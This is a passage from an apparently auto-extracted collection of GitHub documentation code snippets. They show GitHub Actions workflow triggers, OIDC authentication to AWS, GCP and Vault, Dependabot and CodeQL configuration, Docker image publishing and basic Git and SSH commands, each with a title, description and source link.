OWNER: {% raw %}${{ github.repository_owner }}{% endraw %}\n          REPO: {% raw %}${{ github.event.repository.name }}{% endraw %}\n      - run: |\n          gh issue create --title \"Issue report\" --body \"$NUM_OPEN_ISSUES issues remaining\" --repo $GITHUB_REPOSITORY\n        env:\n          GH_TOKEN: {% raw %}${{ secrets.GITHUB_TOKEN }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Triggering Workflow on Multiple Workflow Completions\nDESCRIPTION: This YAML snippet shows how to configure a workflow to run upon the completion of either the 'Staging' or 'Lab' workflows.  The `workflows` array within the `workflow_run` trigger allows specifying multiple workflows that can trigger this workflow's execution.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_56\n\nLANGUAGE: YAML\nCODE:\n```\non:\n  workflow_run:\n    workflows: [Staging, Lab]\n    types:\n      - completed\n```\n\n----------------------------------------\n\nTITLE: Use a specific .NET version in workflow\nDESCRIPTION: This snippet shows how to configure a specific .NET version (6.x, resolving to the latest minor release) using the `setup-dotnet` action. It sets the `dotnet-version` parameter to `6.x`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-net.md#_snippet_2\n\nLANGUAGE: YAML\nCODE:\n```\n    - name: Setup .NET 6.x\n      uses: {% data reusables.actions.action-setup-dotnet %}\n      with:\n        # Semantic version range syntax or exact version of a dotnet version\n        dotnet-version: '6.x'\n```\n\n----------------------------------------\n\nTITLE: Caching Maven Dependencies\nDESCRIPTION: This workflow demonstrates how to cache Maven dependencies using the `setup-java` action. The `cache: maven` option instructs the action to automatically cache the local Maven repository (`.m2` directory). The cache key is based on the `pom.xml` file, so changes to `pom.xml` will invalidate the cache.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-java-with-maven.md#_snippet_2\n\nLANGUAGE: YAML\nCODE:\n```\nsteps:\n  - uses: {% data reusables.actions.action-checkout %}\n  - name: Set up JDK 17\n    uses: {% data reusables.actions.action-setup-java %}\n    with:\n      java-version: '17'\n      distribution: 'temurin'\n      cache: maven\n  - name: Build with Maven\n    run: mvn --batch-mode --update-snapshots verify\n```\n\n----------------------------------------\n\nTITLE: Dependency Review Action Configuration File Example (YAML)\nDESCRIPTION: This YAML snippet provides an example configuration file for the Dependency Review Action. It showcases options like `fail-on-severity` to set the minimum severity level for failing the check, `allow-licenses` and `deny-licenses` for controlling allowed/disallowed licenses, `allow-ghsas` for excluding specific advisories, and `fail-on-scopes` for failing on vulnerabilities in specific scopes.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/supply-chain-security/understanding-your-software-supply-chain/configuring-the-dependency-review-action.md#_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\n# Possible values: \"critical\", \"high\", \"moderate\", \"low\"\n fail-on-severity: critical\n{% ifversion dependency-review-action-licenses %}\n # You can only include one of these two options: `allow-licenses` and `deny-licenses`\n # ([String]). Only allow these licenses (optional)\n # Possible values: Any SPDX-compliant license identifiers or expressions from https://spdx.org/licenses/\n allow-licenses:\n - GPL-3.0\n - BSD-3-Clause\n - MIT\n # ([String]). Block the pull request on these licenses (optional)\n # Possible values: Any SPDX-compliant license identifiers or expressions from https://spdx.org/licenses/\n deny-licenses:\n - LGPL-2.0\n - BSD-2-Clause\n{% endif %}\n # ([String]). Skip these {% data variables.product.prodname_advisory_database %} IDs during detection (optional)\n # Possible values: Any valid {% data variables.product.prodname_advisory_database %} ID from https://github.com/advisories\n allow-ghsas:\n - GHSA-abcd-1234-5679\n - GHSA-efgh-1234-5679\n # ([String]). Block pull requests that introduce vulnerabilities in the scopes that match this list (optional)\n # Possible values: \"development\", \"runtime\", \"unknown\"\n fail-on-scopes:\n - development\n - runtime\n```\n\n----------------------------------------\n\nTITLE: Workflow Triggers Configuration YAML\nDESCRIPTION: This snippet defines workflow triggers that activate the workflow on push events to the 'main' branch, pull requests targeting the 'main' branch (when opened, synchronized, or reopened), and manual triggers via 'workflow_dispatch'. It configures the 'on' section to specify the event types and branch filters.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/deploying/deploying-with-github-actions.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  push:\n    branches:\n      - main\n  pull_request:\n    branches:\n      - main\n  workflow_dispatch:\n```\n\n----------------------------------------\n\nTITLE: Defining Workflow Outputs for Reusable Workflows\nDESCRIPTION: This YAML snippet demonstrates how to define outputs for a reusable workflow using `on.workflow_call.outputs`. It maps workflow outputs (e.g., `workflow_output1`) to job outputs (e.g., `job_output1` from `my_job`). These outputs are available to downstream jobs in the caller workflow.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/workflow-syntax-for-github-actions.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  workflow_call:\n    # Map the workflow outputs to job outputs\n    outputs:\n      workflow_output1:\n        description: \"The first job output\"\n        value: ${{ jobs.my_job.outputs.job_output1 }}\n      workflow_output2:\n        description: \"The second job output\"\n        value: ${{ jobs.my_job.outputs.job_output2 }}\n```\n\n----------------------------------------\n\nTITLE: Configuring IAM role trust policy with wildcard sub claim (JSON)\nDESCRIPTION: This JSON snippet shows an example of an IAM trust policy configuration utilizing a wildcard (*) in the `sub` claim.  This allows any branch, pull request merge branch, or environment from the specified GitHub organization and repository to assume the role in AWS. It uses `StringLike` to allow the wildcard, and `StringEquals` for the `aud` claim to ensure the audience is sts.amazonaws.com. Update octo-org/octo-repo with your organization and repository.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-amazon-web-services.md#_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Effect\": \"Allow\",\n            \"Principal\": {\n                \"Federated\": \"arn:aws:iam::123456123456:oidc-provider/token.actions.githubusercontent.com\"\n            },\n            \"Action\": \"sts:AssumeRoleWithWebIdentity\",\n            \"Condition\": {\n                \"StringLike\": {\n                    \"token.actions.githubusercontent.com:sub\": \"repo:octo-org/octo-repo:*\"\n                },\n                \"StringEquals\": {\n                    \"token.actions.githubusercontent.com:aud\": \"sts.amazonaws.com\"\n                }\n            }\n        }\n    ]\n}\n```\n\n----------------------------------------\n\nTITLE: Trigger workflow on pull request review events with specific types (YAML)\nDESCRIPTION: This snippet demonstrates how to configure a GitHub Actions workflow to run when a pull request review has been edited or dismissed. It uses the `pull_request_review` event trigger with the `types` keyword to specify the desired activity types.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_27\n\nLANGUAGE: YAML\nCODE:\n```\non:\n  pull_request_review:\n    types: [edited, dismissed]\n```\n\n----------------------------------------\n\nTITLE: Job Concurrency Configuration\nDESCRIPTION: This YAML snippet configures concurrency for a specific job within a workflow. It defines a concurrency group named `example-group` and sets `cancel-in-progress` to `true`, ensuring that any in-progress runs of this job within the group are cancelled when a new run is triggered.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/actions-group-concurrency.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  push:\n    branches:\n      - main\n\njobs:\n  job-1:\n    runs-on: ubuntu-latest\n    concurrency:\n      group: example-group\n      cancel-in-progress: true\n```\n\n----------------------------------------\n\nTITLE: Authenticating to GCP with OIDC in GitHub Actions workflow (YAML)\nDESCRIPTION: This YAML snippet demonstrates a GitHub Actions workflow that authenticates to Google Cloud Platform (GCP) using OpenID Connect (OIDC). It defines a job that requests an OIDC token, exchanges it for a Google Cloud access token using the `google-github-actions/auth` action, and then uses the access token to list services in GCP.  The `id-token: write` permission is required to request the JWT.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-google-cloud-platform.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\nname: List services in GCP\non:\n  pull_request:\n    branches:\n      - main\n\npermissions:\n  id-token: write\n\njobs:\n  Get_OIDC_ID_token:\n    runs-on: ubuntu-latest\n    steps:\n    - id: 'auth'\n      name: 'Authenticate to GCP'\n      uses: 'google-github-actions/auth@f1e2d3c4b5a6f7e8d9c0b1a2c3d4e5f6a7b8c9d0'\n      with:\n          create_credentials_file: 'true'\n          workload_identity_provider: 'WORKLOAD-IDENTITY-PROVIDER'\n          service_account: 'SERVICE-ACCOUNT'\n    - id: 'gcloud'\n      name: 'gcloud'\n      run: |-\n        gcloud auth login --brief --cred-file=\"${{ steps.auth.outputs.credentials_file_path }}\"\n        gcloud services list\n```\n\n----------------------------------------\n\nTITLE: Creating an Issue using the REST API with GITHUB_TOKEN in GitHub Actions\nDESCRIPTION: This workflow demonstrates how to create a new issue in a GitHub repository using the GitHub REST API. It uses the `GITHUB_TOKEN` to authenticate the API request, granting the workflow permission to create issues. It requires the `issues: write` permission.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-guides/automatic-token-authentication.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nname: Create issue on commit\n\non: [ push ]\n\njobs:\n  create_issue:\n    runs-on: ubuntu-latest\n    permissions:\n      issues: write\n    steps:\n      - name: Create issue using REST API\n        run: |\n          curl --request POST \\\n          --url {% data variables.product.rest_url %}/repos/${% raw %}{{ github.repository }}{% endraw %}/issues \\\n          --header 'authorization: Bearer ${% raw %}{{ secrets.GITHUB_TOKEN }}{% endraw %}' \\\n          --header 'content-type: application/json' \\\n          --data '{\n            \"title\": \"Automated issue for commit: ${% raw %}{{ github.sha }}{% endraw %}\",\n            \"body\": \"This issue was automatically created by the GitHub Action workflow **${% raw %}{{ github.workflow }}{% endraw %}**. \\n\\n The commit hash was: _${% raw %}{{ github.sha }}{% endraw %}_.\"\n            }' \\\n          --fail\n```\n\n----------------------------------------\n\nTITLE: Azure Artifacts Registry Configuration\nDESCRIPTION: This YAML snippet shows how to configure a private Azure Artifacts feed in the `dependabot.yml` file.  It includes the feed URL, type, and token. Requires an Azure DevOps token with appropriate permissions.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/guidance-for-the-configuration-of-private-registries-for-dependabot.md#_snippet_25\n\nLANGUAGE: YAML\nCODE:\n```\nregistries:\n  nuget-azure-devops:\n    type: nuget-feed\n    url: https://pkgs.dev.azure.com/my_org/_packaging/public/nuget/v3/index.json\n    token: ${{secrets.AZURE_DEVOPS_TOKEN}}\n```\n\n----------------------------------------\n\nTITLE: Dockerfile Example\nDESCRIPTION: This Dockerfile sets up a development container for JavaScript Node.js projects. It specifies a base image, installs bundler, copies a script, and runs it. The Dockerfile utilizes ARG, FROM, COPY, and RUN instructions to configure the environment.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/setting-up-your-project-for-codespaces/adding-a-dev-container-configuration/introduction-to-dev-containers.md#_snippet_0\n\nLANGUAGE: dockerfile\nCODE:\n```\nARG VARIANT=\"16\"\nFROM mcr.microsoft.com/devcontainers/javascript-node:1-${VARIANT}\n\nRUN apt-get update && export DEBIAN_FRONTEND=noninteractive \\\n    && apt-get -y install --no-install-recommends bundler\n\n# [Optional] Uncomment if you want to install an additional version\n#  of node using nvm\n# ARG EXTRA_NODE_VERSION=18\n# RUN su node -c \"source /usr/local/share/nvm/nvm.sh \\\n#    && nvm install ${EXTRA_NODE_VERSION}\"\n\nCOPY ./script-in-your-repo.sh /tmp/scripts/script-in-codespace.sh\nRUN apt-get update && bash /tmp/scripts/script-in-codespace.sh\n```\n\n----------------------------------------\n\nTITLE: Installing Python dependencies with pip\nDESCRIPTION: This snippet configures a Python version and installs dependencies using pip, upgrading pip, setuptools, and wheel.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-python.md#_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n- uses: {% data reusables.actions.action-checkout %}\n- name: Set up Python\n  uses: {% data reusables.actions.action-setup-python %}\n  with:\n    python-version: '3.x'\n- name: Install dependencies\n  run: python -m pip install --upgrade pip setuptools wheel\n```\n\n----------------------------------------\n\nTITLE: GitHub Actions Workflow for SARIF Upload\nDESCRIPTION: This workflow uploads a SARIF file (results.sarif) located in the root of the repository to GitHub Code Scanning. It runs on every push and is scheduled to run weekly, using the `github/codeql-action/upload-sarif` action. The workflow requires `security-events: write` permission and optionally `actions: read` and `contents: read` for private repositories.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/integrating-with-code-scanning/uploading-a-sarif-file-to-github.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\nname: \"Upload SARIF\"\n\n# Run workflow each time code is pushed to your repository and on a schedule.\n# The scheduled workflow runs every Thursday at 15:45 UTC.\non:\n  push:\n  schedule:\n    - cron: '45 15 * * 4'\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    permissions:\n      # required for all workflows\n      security-events: write\n      # only required for workflows in private repositories\n      actions: read\n      contents: read\n    steps:\n      # This step checks out a copy of your repository.\n      - name: Checkout repository\n        uses: {% data reusables.actions.action-checkout %}\n      - name: Upload SARIF file\n        uses: {% data reusables.actions.action-codeql-action-upload-sarif %}\n        with:\n          # Path to SARIF file relative to the root of the repository\n          sarif_file: results.sarif\n          # Optional category for the results\n          # Used to differentiate multiple results for one commit\n          category: my-analysis-tool\n```\n\n----------------------------------------\n\nTITLE: Creating SSH config file - Shell\nDESCRIPTION: This command creates a new SSH config file at the default location `~/.ssh/config` if it doesn't already exist. It's necessary for configuring SSH agent behavior on macOS.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/connecting-to-github-with-ssh/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\ntouch ~/.ssh/config\n```\n\n----------------------------------------\n\nTITLE: Generating and Masking a Secret in a Single Job (Bash)\nDESCRIPTION: This YAML snippet defines a GitHub Actions workflow job that generates a random secret, masks it using `add-mask`, and then makes it available as an output to other steps within the same job. It demonstrates how to prevent the secret from being displayed in the logs.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_19\n\nLANGUAGE: yaml\nCODE:\n```\non: push\njobs:\n  generate-a-secret-output:\n    runs-on: ubuntu-latest\n    steps:\n      - id: sets-a-secret\n        name: Generate, mask, and output a secret\n        run: |\n          the_secret=$((RANDOM))\n          echo \"::add-mask::$the_secret\"\n          echo \"secret-number=$the_secret\" >> \"$GITHUB_OUTPUT\"\n      - name: Use that secret output (protected by a mask)\n        run: |{% raw %}\n          echo \"the secret number is ${{ steps.sets-a-secret.outputs.secret-number }}\"{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Specifying CodeQL Query Packs in Workflow\nDESCRIPTION: This YAML snippet demonstrates how to specify CodeQL query packs within a GitHub Actions workflow using the `packs` parameter of the `codeql-action/init` action. It shows how to specify different versions of packs and paths to specific queries within a pack.  The packs are downloaded and the default queries or the queries defined in the path are executed during the CodeQL analysis.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/creating-an-advanced-setup-for-code-scanning/customizing-your-advanced-setup-for-code-scanning.md#_snippet_9\n\nLANGUAGE: yaml\nCODE:\n```\n- uses: {% data reusables.actions.action-codeql-action-init %}\n  with:\n    # Comma-separated list of packs to download\n    packs: scope/pack1,scope/pack2@1.2.3,scope/pack3@~3.2.1,scope/pack4@4.5.6:path/to/queries\n```\n\n----------------------------------------\n\nTITLE: Merging a pull request using GitHub CLI\nDESCRIPTION: This command demonstrates how to merge a pull request using the `gh pr merge` subcommand.  Replace `PULL-REQUEST` with the pull request's number, URL, or head branch. It initiates an interactive process for completing the merge.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/collaborating-with-pull-requests/incorporating-changes-from-a-pull-request/merging-a-pull-request.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ngh pr merge PULL-REQUEST\n```\n\n----------------------------------------\n\nTITLE: Contributing to a GitHub Repository using Git\nDESCRIPTION: This snippet illustrates the process of contributing to an existing GitHub repository.  It involves cloning the repository, creating and checking out a new branch, making changes, staging and committing those changes, and finally pushing the branch to GitHub. It assumes the user has already cloned the repository. Replace `owner/repo` with the actual owner and repository name.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/using-git/about-git.md#_snippet_1\n\nLANGUAGE: Bash\nCODE:\n```\n# download a repository on {% data variables.product.github %} to our machine\n# Replace `owner/repo` with the owner and name of the repository to clone\ngit clone https://github.com/owner/repo.git\n\n# change into the `repo` directory\ncd repo\n\n# create a new branch to store any new changes\ngit branch my-branch\n\n# switch to that branch (line of development)\ngit checkout my-branch\n\n# make changes, for example, edit `file1.md` and `file2.md` using the text editor\n\n# stage the changed files\ngit add file1.md file2.md\n\n# take a snapshot of the staging area (anything that's been added)\ngit commit -m \"my snapshot\"\n\n# push changes to github\ngit push --set-upstream origin my-branch\n```\n\n----------------------------------------\n\nTITLE: Define Docker Image Creation and Publishing Workflow - YAML\nDESCRIPTION: This YAML snippet defines a GitHub Actions workflow to create and publish a Docker image to a container registry. It configures the workflow to trigger on pushes to the 'release' branch, defines environment variables for the registry and image name, and sets up a job to build and push the image.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/package_registry/publish-docker-image.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\n#\nname: Create and publish a Docker image\n\n# Configures this workflow to run every time a change is pushed to the branch called `release`.\non:\n  push:\n    branches: ['release']\n\n# Defines two custom environment variables for the workflow. These are used for the {% data variables.product.prodname_container_registry %} domain, and a name for the Docker image that this workflow builds.\nenv:\n  REGISTRY: {% data reusables.package_registry.container-registry-hostname %}\n  IMAGE_NAME: {% raw %}${{ github.repository }}{% endraw %}\n\n# There is a single job in this workflow. It's configured to run on the latest available version of Ubuntu.\njobs:\n  build-and-push-image:\n    runs-on: {% ifversion ghes %}[self-hosted]{% else %}ubuntu-latest{% endif %}\n    # Sets the permissions granted to the `GITHUB_TOKEN` for the actions in this job.\n    permissions:\n      contents: read\n      packages: write\n      {% ifversion artifact-attestations %}attestations: write{% endif %}\n      {% ifversion artifact-attestations %}id-token: write{% endif %}\n      #\n    steps:\n      - name: Checkout repository\n        uses: {% data reusables.actions.action-checkout %}\n      # Uses the `docker/login-action` action to log in to the {% data variables.product.prodname_container_registry %} registry using the account and password that will publish the packages. Once published, the packages are scoped to the account defined here.\n      - name: Log in to the Container registry\n        uses: docker/login-action@65b78e6e13532edd9afa3aa52ac7964289d1a9c1\n        with:\n          registry: {% raw %}${{ env.REGISTRY }}{% endraw %}\n          username: {% raw %}${{ github.actor }}{% endraw %}\n          password: {% raw %}${{ secrets.GITHUB_TOKEN }}{% endraw %}\n      # This step uses [docker/metadata-action](https://github.com/docker/metadata-action#about) to extract tags and labels that will be applied to the specified image. The `id` \"meta\" allows the output of this step to be referenced in a subsequent step. The `images` value provides the base name for the tags and labels.\n      - name: Extract metadata (tags, labels) for Docker\n        id: meta\n        uses: docker/metadata-action@9ec57ed1fcdbf14dcef7dfbe97b2010124a938b7\n        with:\n          images: {% raw %}${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}{% endraw %}\n      # This step uses the `docker/build-push-action` action to build the image, based on your repository's `Dockerfile`. If the build succeeds, it pushes the image to {% data variables.product.prodname_registry %}.\n      # It uses the `context` parameter to define the build's context as the set of files located in the specified path. For more information, see [Usage](https://github.com/docker/build-push-action#usage) in the README of the `docker/build-push-action` repository.\n      # It uses the `tags` and `labels` parameters to tag and label the image with the output from the \"meta\" step.\n      - name: Build and push Docker image\n        id: push\n        uses: docker/build-push-action@f2a1d5e99d037542a71f64918e516c093c6f3fc4\n        with:\n          context: .\n          push: true\n          tags: {% raw %}${{ steps.meta.outputs.tags }}{% endraw %}\n          labels: {% raw %}${{ steps.meta.outputs.labels }}{% endraw %}\n      {% ifversion artifact-attestations %}\n      # This step generates an artifact attestation for the image, which is an unforgeable statement about where and how it was built. It increases supply chain security for people who consume the image. For more information, see [Using artifact attestations to establish provenance for builds](/actions/security-guides/using-artifact-attestations-to-establish-provenance-for-builds).\n      - name: Generate artifact attestation\n        uses: actions/attest-build-provenance@v2\n        with:\n          subject-name: {% raw %}${{ env.REGISTRY }}/${{ env.IMAGE_NAME}}{% endraw %}\n          subject-digest: {% raw %}${{ steps.push.outputs.digest }}{% endraw %}\n          push-to-registry: true\n      {% endif %}\n```\n\n----------------------------------------\n\nTITLE: Caching Python dependencies using setup-python action\nDESCRIPTION: This snippet configures a Python version and caches dependencies managed by pip using the `setup-python` action.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-python.md#_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n- uses: {% data reusables.actions.action-checkout %}\n- uses: {% data reusables.actions.action-setup-python %}\n  with:\n    python-version: '3.12'\n    cache: 'pip'\n- run: pip install -r requirements.txt\n- run: pip test\n```\n\n----------------------------------------\n\nTITLE: Configure workflow to close inactive issues in YAML\nDESCRIPTION: This workflow configures a GitHub Action to close inactive issues. It schedules the workflow to run daily, uses the `actions/stale` action to identify and close stale issues, sets parameters for staleness and closure based on inactivity, adds labels and messages, and configures the GitHub token for authentication. The `permissions` block grants write access to issues and pull requests.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/project-management/closing-inactive-issues.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nname: Close inactive issues\non:\n  schedule:\n    - cron: \"30 1 * * *\"\n\njobs:\n  close-issues:\n    runs-on: ubuntu-latest\n    permissions:\n      issues: write\n      pull-requests: write\n    steps:\n      - uses: {% data reusables.actions.action-stale %}\n        with:\n          days-before-issue-stale: 30\n          days-before-issue-close: 14\n          stale-issue-label: \"stale\"\n          stale-issue-message: \"This issue is stale because it has been open for 30 days with no activity.\"\n          close-issue-message: \"This issue was closed because it has been inactive for 14 days since being marked as stale.\"\n          days-before-pr-stale: -1\n          days-before-pr-close: -1\n          repo-token: {% raw %}${{ secrets.GITHUB_TOKEN }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: GitHub Actions Runner Syntax\nDESCRIPTION: This YAML snippet illustrates how to specify runners in GitHub Actions using the `runs-on` key. It defines two jobs, `windows_job` and `linux_job`, each with a `runs-on` value that specifies the desired platform. The scripts contain echo commands tailored to each platform.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-gitlab-cicd-to-github-actions.md#_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\nwindows_job:\n  runs-on: windows-latest\n  steps:\n    - run: echo Hello, %USERNAME%!\n\nlinux_job:\n  runs-on: ubuntu-latest\n  steps:\n    - run: echo \"Hello, $USER!\"\n```\n\n----------------------------------------\n\nTITLE: Configuring Bundler with PAT\nDESCRIPTION: This command configures Bundler to authenticate with the GitHub Packages registry using a personal access token. USERNAME is your GitHub username, TOKEN is your personal access token, and NAMESPACE is the namespace (user or org). Conditional logic addresses different registry URL configurations based on GitHub deployment environment.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-rubygems-registry.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\nbundle config https://{% ifversion fpt or ghec %}rubygems.pkg.github.com{% else %}REGISTRY_URL{% endif %}/NAMESPACE USERNAME:TOKEN\n```\n\n----------------------------------------\n\nTITLE: GitHub Actions Job Dependency Syntax\nDESCRIPTION: This YAML snippet demonstrates how to define job dependencies in GitHub Actions using the `needs` key. `build_a` and `build_b` run in parallel. `test_ab` depends on both `build_a` and `build_b`, and `deploy_ab` depends on `test_ab`. Each job contains an echo command.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-gitlab-cicd-to-github-actions.md#_snippet_9\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  build_a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"This job will be run first.\"\n\n  build_b:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"This job will be run first, in parallel with build_a\"\n\n  test_ab:\n    runs-on: ubuntu-latest\n    needs: [build_a,build_b]\n    steps:\n      - run: echo \"This job will run after build_a and build_b have finished\"\n\n  deploy_ab:\n    runs-on: ubuntu-latest\n    needs: [test_ab]\n    steps:\n      - run: echo \"This job will run after test_ab is complete\"\n```\n\n----------------------------------------\n\nTITLE: Service Credentials Configuration - YAML\nDESCRIPTION: This example shows how to configure credentials for two services, `myservice1` and `myservice2`. `myservice1` uses the `github.actor` and `secrets.github_token` for authentication with a GitHub Container Registry, while `myservice2` uses `secrets.DOCKER_USER` and `secrets.DOCKER_PASSWORD` to authenticate with Docker Hub.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/workflow-syntax-for-github-actions.md#_snippet_33\n\nLANGUAGE: yaml\nCODE:\n```\nservices:\n  myservice1:\n    image: ghcr.io/owner/myservice1\n    credentials:\n      username: ${{ github.actor }}\n      password: ${{ secrets.github_token }}\n  myservice2:\n    image: dockerhub_org/myservice2\n    credentials:\n      username: ${{ secrets.DOCKER_USER }}\n      password: ${{ secrets.DOCKER_PASSWORD }}\n```\n\n----------------------------------------\n\nTITLE: CodeQL Configuration in GitHub Actions Workflow - YAML\nDESCRIPTION: This YAML snippet shows how to use the `config` input of the `init` command in a {% data variables.product.prodname_actions %} workflow file to specify configuration details for CodeQL.  It demonstrates disabling default queries, adding the `security-extended` query suite, and excluding queries tagged with `cwe-020`. The `languages` input uses a matrix variable.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/creating-an-advanced-setup-for-code-scanning/customizing-your-advanced-setup-for-code-scanning.md#_snippet_20\n\nLANGUAGE: yaml\nCODE:\n```\n- uses: {% data reusables.actions.action-codeql-action-init %}\n  with:\n    languages: {% raw %}${{ matrix.language }}{% endraw %}\n    config: |\n      disable-default-queries: true\n      queries:\n        - uses: security-extended\n      query-filters:\n        - exclude:\n            tags: /cwe-020/\n```\n\n----------------------------------------\n\nTITLE: Handling OAuth callback and exchanging code for token\nDESCRIPTION: This Ruby snippet defines a route for the '/callback' path, which is the callback URL specified during OAuth app registration. It extracts the temporary GitHub code from the request parameters, POSTs it back to GitHub along with the client ID and client secret to obtain an access token. It utilizes the 'rest-client' library for making HTTP requests and the 'json' library for parsing JSON responses. The result contains the access token.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/oauth-apps/building-oauth-apps/authenticating-to-the-rest-api-with-an-oauth-app.md#_snippet_2\n\nLANGUAGE: ruby\nCODE:\n```\nget '/callback' do\n  # get temporary GitHub code...\n  session_code = request.env['rack.request.query_hash']['code']\n\n  # ... and POST it back to GitHub\n  result = RestClient.post('https://github.com/login/oauth/access_token',\n                          {:client_id => CLIENT_ID,\n                           :client_secret => CLIENT_SECRET,\n                           :code => session_code},\n                           :accept => :json)\n\n  # extract the token and granted scopes\n  access_token = JSON.parse(result)['access_token']\nend\n```\n\n----------------------------------------\n\nTITLE: npm Configuration File for GitHub Package Registry\nDESCRIPTION: This `.npmrc` file configures npm to use the GitHub Package Registry for packages within the `@YOUR-USERNAME` scope. Replace `YOUR-USERNAME` with your GitHub username. This ensures that npm publishes and installs packages from the correct registry.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/quickstart.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\n@YOUR-USERNAME:registry=https://npm.pkg.github.com\n```\n\n----------------------------------------\n\nTITLE: Triggering Workflow on Push to Specific Branches (YAML)\nDESCRIPTION: This workflow configuration will trigger the workflow when a push event occurs on the `main` branch or any branch that starts with `releases/`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_36\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  push:\n    branches:\n      - 'main'\n      - 'releases/**'\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_JOB_STATUS to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_JOB_STATUS` to the GitHub Actions equivalent `${{ job.status }}`. This variable provides the current status of the job in GitHub Actions.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_26\n\nLANGUAGE: YAML\nCODE:\n```\n${{ job.status }}\n```\n\n----------------------------------------\n\nTITLE: Requesting JWT with curl command in shell\nDESCRIPTION: This shell command demonstrates how to request a JSON Web Token (JWT) from GitHub's OIDC provider using a `curl` command. It utilizes the `ACTIONS_ID_TOKEN_REQUEST_URL` and `ACTIONS_ID_TOKEN_REQUEST_TOKEN` environment variables for authentication. The `audience` parameter is also passed in the URL.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncurl -H \"Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN\" \"$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange\"\n```\n\n----------------------------------------\n\nTITLE: Enabling JWT Auth Method in HashiCorp Vault (Shell)\nDESCRIPTION: This command enables the JWT authentication method in HashiCorp Vault, which is necessary for using OIDC.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-hashicorp-vault.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nvault auth enable 